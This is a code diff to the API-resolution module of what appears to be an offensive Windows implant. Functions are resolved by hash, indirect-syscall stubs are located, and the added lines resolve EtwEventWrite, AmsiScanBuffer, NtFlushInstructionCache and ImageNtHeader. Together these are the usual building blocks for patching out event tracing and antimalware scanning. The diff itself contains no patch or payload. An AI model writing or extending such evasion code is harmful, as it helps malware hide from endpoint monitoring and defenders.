@@ -58,6 +58,8 @@ namespace Procs
         BOOL bIndirectSyscall
     ) {
         // NTAPI (Ntdll)
+        PVOID pEtwEventWrite                    = GetProcAddressByHash(hNtdll, HASH_FUNC_ETWEVENTWRITE);
+        pProcs->lpEtwEventWrite                 = reinterpret_cast<LPPROC_ETWEVENTWRITE>(pEtwEventWrite);
         PVOID pLdrLoadDll                       = GetProcAddressByHash(hNtdll, HASH_FUNC_LDRLOADDLL);
         pProcs->lpLdrLoadDll                    = reinterpret_cast<LPPROC_LDRLOADDLL>(pLdrLoadDll);
         PVOID pNtAllocateVirtualMemory          = GetProcAddressByHash(hNtdll, HASH_FUNC_NTALLOCATEVIRTUALMEMORY);
@@ -74,6 +76,8 @@ namespace Procs
         pProcs->lpNtCreateThreadEx              = reinterpret_cast<LPPROC_NTCREATETHREADEX>(pNtCreateThreadEx);
         PVOID pNtDuplicateObject                = GetProcAddressByHash(hNtdll, HASH_FUNC_NTDUPLICATEOBJECT);
         pProcs->lpNtDuplicateObject             = reinterpret_cast<LPPROC_NTDUPLICATEOBJECT>(pNtDuplicateObject);
+        PVOID pNtFlushInstructionCache          = GetProcAddressByHash(hNtdll, HASH_FUNC_NTFLUSHINSTRUCTIONCACHE);
+        pProcs->lpNtFlushInstructionCache       = reinterpret_cast<LPPROC_NTFLUSHINSTRUCTIONCACHE>(pNtFlushInstructionCache);
         PVOID pNtFreeVirtualMemory              = GetProcAddressByHash(hNtdll, HASH_FUNC_NTFREEVIRTUALMEMORY);
         pProcs->lpNtFreeVirtualMemory           = reinterpret_cast<LPPROC_NTFREEVIRTUALMEMORY>(pNtFreeVirtualMemory);
         PVOID pNtGetContextThread               = GetProcAddressByHash(hNtdll, HASH_FUNC_NTGETCONTEXTTHREAD);
@@ -231,6 +235,7 @@ namespace Procs
 
         if (bIndirectSyscall)
         {
+            pProcs->sysEtwEventWrite                = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pEtwEventWrite));
             pProcs->sysLdrLoadDll                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pLdrLoadDll));
             pProcs->sysNtAllocateVirtualMemory      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtAllocateVirtualMemory));
             pProcs->sysNtClose                      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtClose));
@@ -238,6 +243,7 @@ namespace Procs
             pProcs->sysNtCreateProcessEx            = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateProcessEx));
             pProcs->sysNtCreateSection              = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateSection));
             pProcs->sysNtCreateThreadEx             = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateThreadEx));
+            pProcs->sysNtFlushInstructionCache      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtFlushInstructionCache));
             pProcs->sysNtFreeVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtFreeVirtualMemory));
             pProcs->sysNtGetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtGetContextThread));
             pProcs->sysNtMapViewOfSection           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtMapViewOfSection));
@@ -266,10 +272,12 @@ namespace Procs
     }
 
     VOID FindProcsMisc(
-        Procs::PPROCS   pProcs,
+        Procs::PPROCS pProcs,
         HMODULE hAdvapi32,
+        HMODULE hAmsi,
         HMODULE hBcrypt,
         HMODULE hCrypt32,
+        HMODULE hDbghelp,
         HMODULE hUser32,
         HMODULE hWinHttp,
         HMODULE hWs2_32
@@ -281,6 +289,10 @@ namespace Procs
         pProcs->lpLookupPrivilegeValueW         = reinterpret_cast<LPPROC_LOOKUPPRIVILEGEVALUEW>(pLookupPrivilegeValueW);
         PVOID pOpenProcessToken                 = GetProcAddressByHash(hAdvapi32, HASH_FUNC_OPENPROCESSTOKEN);
         pProcs->lpOpenProcessToken              = reinterpret_cast<LPPROC_OPENPROCESSTOKEN>(pOpenProcessToken);
+
+        // Amsi
+        PVOID pAmsiScanBuffer                   = GetProcAddressByHash(hAmsi, HASH_FUNC_AMSISCANBUFFER);
+        pProcs->lpAmsiScanBuffer                = reinterpret_cast<LPPROC_AMSISCANBUFFER>(pAmsiScanBuffer);
 
         // Bcrypt
         PVOID pBCryptCloseAlgorithmProvider     = GetProcAddressByHash(hBcrypt, HASH_FUNC_BCRYPTCLOSEALGORITHMPROVIDER);
@@ -305,6 +317,10 @@ namespace Procs
         pProcs->lpCryptBinaryToStringW          = reinterpret_cast<LPPROC_CRYPTBINARYTOSTRINGW>(pCryptBinaryToStringW);
         PVOID pCryptStringToBinaryW             = GetProcAddressByHash(hCrypt32, HASH_FUNC_CRYPTSTRINGTOBINARYW);
         pProcs->lpCryptStringToBinaryW          = reinterpret_cast<LPPROC_CRYPTSTRINGTOBINARYW>(pCryptStringToBinaryW);
+
+        // Dbghelp
+        PVOID pImageNtHeader                    = GetProcAddressByHash(hDbghelp, HASH_FUNC_IMAGENTHEADER);
+        pProcs->lpImageNtHeader                 = reinterpret_cast<LPPROC_IMAGENTHEADER>(pImageNtHeader);
 
         // User32
         PVOID pFindWindowW                      = GetProcAddressByHash(hUser32, HASH_FUNC_FINDWINDOWW);
